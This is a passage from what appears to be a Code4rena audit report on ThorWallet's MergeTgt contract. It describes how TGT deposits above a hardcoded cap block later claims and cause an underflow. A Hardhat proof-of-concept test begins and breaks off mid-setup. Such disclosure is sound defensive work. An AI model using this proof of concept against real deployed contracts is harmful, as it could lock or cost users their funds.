<h3 style="position:relative;" id="finding-description-and-impact"><a class="anchor before" aria-label="finding description and impact permalink" href="https://code4rena.com/reports/2025-02-thorwallet#finding-description-and-impact"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>MergeTgt has hardcoded amounts of TGT<em>TO</em>EXCHANGE and TITN<em>ARB. Their ratio is used for rate calculation and TITN</em>ARB amount of TITN is deposited to be claimed.</p>
<p>The contract has no actual logic which would limit the deposited Tgt to MergeTgt. This means if this amount is crossed, any last claimers will not be able to do so or retrieve their Tgt back.</p>
<p>This same vulnerability also introduces an overflow in <code>withdrawRemainingTitn</code>. Since TGT is allowed to exceed the hardcoded value, the claimable TINT exceeds the actual mergeTgt contract TITN balance.</p>
<p>And this line overflows, as <code>remainingTitnAfter1Year</code> becomes less than the <code>initialTotalClaimable</code>.</p>
<pre data-index="0" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">uint256 unclaimedTitn = remainingTitnAfter1Year - initialTotalClaimable;</span></span></code></pre>
<p>Likelihood: Medium - The total Tgt of all users has to exceed TGT<em>TO</em>EXCHANGE. According to blockchain explorers, ARB has 447,034,102 and ETH has 897,791,792, which is more than double the TGT<em>TO</em>EXCHANGE of 579,000,000, so quite likely.</p>
<p>Impact: High - loss of user funds and breaking contract logic (revert on claim).</p>
<h3 style="position:relative;" id="proof-of-concept"><a class="anchor before" aria-label="proof of concept permalink" href="https://code4rena.com/reports/2025-02-thorwallet#proof-of-concept"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>A modified MNrgeTgt.test.ts. Main modifications:</p>
<ul>
<li>TGT total supply is increased above 579<em>000</em>000 </li>
<li>All user total TGT deposit to mergeTGT is above 579<em>000</em>000 </li>
</ul>
<p>Steps in tests:</p>
<ul>
<li>User1 deposits 100 TGT</li>
<li>User2 deposits 578999999 TGT</li>
<li>User1 claims successfully</li>
<li>User2 claim fails due to mergeTgt not having enough TITN.</li>
</ul>
<pre data-index="1" data-language="typescript" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> { </span><span class="mtk12">SignerWithAddress</span><span class="mtk1"> } </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">'@nomiclabs/hardhat-ethers/signers'</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> { </span><span class="mtk12">time</span><span class="mtk1"> } </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">'@nomicfoundation/hardhat-network-helpers'</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> { </span><span class="mtk12">expect</span><span class="mtk1"> } </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">'chai'</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> { </span><span class="mtk12">Contract</span><span class="mtk1">, </span><span class="mtk12">ContractFactory</span><span class="mtk1"> } </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">'ethers'</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> { </span><span class="mtk12">deployments</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1"> } </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">'hardhat'</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> { </span><span class="mtk12">Options</span><span class="mtk1"> } </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">'@layerzerolabs/lz-v2-utilities'</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">describe</span><span class="mtk1">(</span><span class="mtk8">'Audit MergeTgt tests'</span><span class="mtk1">, </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Constant representing a mock Endpoint ID for testing purposes</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">eidA</span><span class="mtk1"> = </span><span class="mtk7">1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">eidB</span><span class="mtk1"> = </span><span class="mtk7">2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Other variables to be used in the test suite</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">Titn</span><span class="mtk1">: </span><span class="mtk10">ContractFactory</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">MergeTgt</span><span class="mtk1">: </span><span class="mtk10">ContractFactory</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">Tgt</span><span class="mtk1">: </span><span class="mtk10">ContractFactory</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">EndpointV2Mock</span><span class="mtk1">: </span><span class="mtk10">ContractFactory</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">ownerA</span><span class="mtk1">: </span><span class="mtk10">SignerWithAddress</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">ownerB</span><span class="mtk1">: </span><span class="mtk10">SignerWithAddress</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">endpointOwner</span><span class="mtk1">: </span><span class="mtk10">SignerWithAddress</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">user1</span><span class="mtk1">: </span><span class="mtk10">SignerWithAddress</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">user2</span><span class="mtk1">: </span><span class="mtk10">SignerWithAddress</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">user3</span><span class="mtk1">: </span><span class="mtk10">SignerWithAddress</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">baseTITN</span><span class="mtk1">: </span><span class="mtk10">Contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">arbTITN</span><span class="mtk1">: </span><span class="mtk10">Contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">mergeTgt</span><span class="mtk1">: </span><span class="mtk10">Contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">tgt</span><span class="mtk1">: </span><span class="mtk10">Contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">mockEndpointV2A</span><span class="mtk1">: </span><span class="mtk10">Contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">mockEndpointV2B</span><span class="mtk1">: </span><span class="mtk10">Contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Before hook for setup that runs once before all tests in the block</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">before</span><span class="mtk1">(</span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Contract factory for our tested contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">Titn</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">'Titn'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">MergeTgt</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">'MergeTgt'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">Tgt</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">'Tgt'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Fetching the first three signers (accounts) from Hardhat's local Ethereum network</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">signers</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getSigners</span><span class="mtk1">()</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ;[</span><span class="mtk12">ownerA</span><span class="mtk1">, </span><span class="mtk12">ownerB</span><span class="mtk1">, </span><span class="mtk12">endpointOwner</span><span class="mtk1">, </span><span class="mtk12">user1</span><span class="mtk1">, </span><span class="mtk12">user2</span><span class="mtk1">, </span><span class="mtk12">user3</span><span class="mtk1">] = </span><span class="mtk12">signers</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// The EndpointV2Mock contract comes from @layerzerolabs/test-devtools-evm-hardhat package</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// and its artifacts are connected as external artifacts to this project</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">EndpointV2MockArtifact</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">deployments</span><span class="mtk1">.</span><span class="mtk11">getArtifact</span><span class="mtk1">(</span><span class="mtk8">'EndpointV2Mock'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">EndpointV2Mock</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">ContractFactory</span><span class="mtk1">(</span><span class="mtk12">EndpointV2MockArtifact</span><span class="mtk1">.</span><span class="mtk12">abi</span><span class="mtk1">, </span><span class="mtk12">EndpointV2MockArtifact</span><span class="mtk1">.</span><span class="mtk12">bytecode</span><span class="mtk1">, </span><span class="mtk12">endpointOwner</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    })</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">beforeEach</span><span class="mtk1">(</span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deploying a mock LZEndpoint with the given Endpoint ID</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">mockEndpointV2A</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">EndpointV2Mock</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">(</span><span class="mtk12">eidA</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">mockEndpointV2B</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">EndpointV2Mock</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">(</span><span class="mtk12">eidB</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deploying two instances of the TITN contract with different identifiers and linking them to the mock LZEndpoint</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">baseTITN</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">Titn</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">'baseTitn'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">'baseTITN'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">mockEndpointV2A</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">ownerA</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'1000000000'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        )</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">arbTITN</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">Titn</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">'arbTitn'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">'arbTITN'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">mockEndpointV2B</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">ownerB</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'0'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        )</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Setting destination endpoints in the LZEndpoint mock for each TITN instance</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mockEndpointV2A</span><span class="mtk1">.</span><span class="mtk11">setDestLzEndpoint</span><span class="mtk1">(</span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">mockEndpointV2B</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mockEndpointV2B</span><span class="mtk1">.</span><span class="mtk11">setDestLzEndpoint</span><span class="mtk1">(</span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">mockEndpointV2A</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Setting each TITN instance as a peer of the other in the mock LZEndpoint</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">ownerA</span><span class="mtk1">).</span><span class="mtk11">setPeer</span><span class="mtk1">(</span><span class="mtk12">eidB</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">zeroPad</span><span class="mtk1">(</span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk7">32</span><span class="mtk1">))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">ownerB</span><span class="mtk1">).</span><span class="mtk11">setPeer</span><span class="mtk1">(</span><span class="mtk12">eidA</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">zeroPad</span><span class="mtk1">(</span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk7">32</span><span class="mtk1">))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Defining the amount of tokens to send and constructing the parameters for the send operation</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">tokensToSend</span><span class="mtk1"> = </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">'173700000'</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Defining extra message execution options for the send operation</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">options</span><span class="mtk1"> = </span><span class="mtk12">Options</span><span class="mtk1">.</span><span class="mtk11">newOptions</span><span class="mtk1">().</span><span class="mtk11">addExecutorLzReceiveOption</span><span class="mtk1">(</span><span class="mtk7">200000</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">).</span><span class="mtk11">toHex</span><span class="mtk1">().</span><span class="mtk11">toString</span><span class="mtk1">()</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">sendParam</span><span class="mtk1"> = [</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">eidB</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">zeroPad</span><span class="mtk1">(</span><span class="mtk12">ownerB</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk7">32</span><span class="mtk1">),</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">tokensToSend</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">tokensToSend</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">options</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">'0x'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">'0x'</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ]</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Fetching the native fee for the token send operation</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk4">const</span><span class="mtk1"> [</span><span class="mtk12">nativeFee</span><span class="mtk1">] = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk11">quoteSend</span><span class="mtk1">(</span><span class="mtk12">sendParam</span><span class="mtk1">, </span><span class="mtk4">false</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Executing the send operation from TITN contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">baseTITN</span><span class="mtk1">.</span><span class="mtk11">send</span><span class="mtk1">(</span><span class="mtk12">sendParam</span><span class="mtk1">, [</span><span class="mtk12">nativeFee</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">], </span><span class="mtk12">ownerA</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, { </span><span class="mtk12">value:</span><span class="mtk1"> </span><span class="mtk12">nativeFee</span><span class="mtk1"> })</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deply MockTGT contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// @audit increased total supply above mergeTGT hardcoded 579_000_000</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">tgt</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">Tgt</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">(</span><span class="mtk8">'Tgt'</span><span class="mtk1">, </span><span class="mtk8">'TGT'</span><span class="mtk1">, </span><span class="mtk12">ownerB</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'100000000000'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Deploy MergeTgt contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">mergeTgt</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">MergeTgt</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">(</span><span class="mtk12">tgt</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ownerB</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Arbitrum setup</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">ownerB</span><span class="mtk1">).</span><span class="mtk11">setTransferAllowedContract</span><span class="mtk1">(</span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">ownerB</span><span class="mtk1">).</span><span class="mtk11">setLaunchTime</span><span class="mtk1">()</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">ownerB</span><span class="mtk1">).</span><span class="mtk11">setLockedStatus</span><span class="mtk1">(</span><span class="mtk7">1</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// now the admin should deposit all ARB.TITN into the mergeTGT contract</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">ownerB</span><span class="mtk1">).</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'173700000'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">mergeTgt</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">ownerB</span><span class="mtk1">).</span><span class="mtk11">deposit</span><span class="mtk1">(</span><span class="mtk12">arbTITN</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk12">utils</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">'173700000'</span><span class="mtk1">, </span><span class="mtk7">18</span><span class="mtk1">))</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// let's send some TGT to user1 and user2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// @audit send close to 579_000_000 TGT to user1 (just above the mergeTGT hardcoded value)</span></span></span>
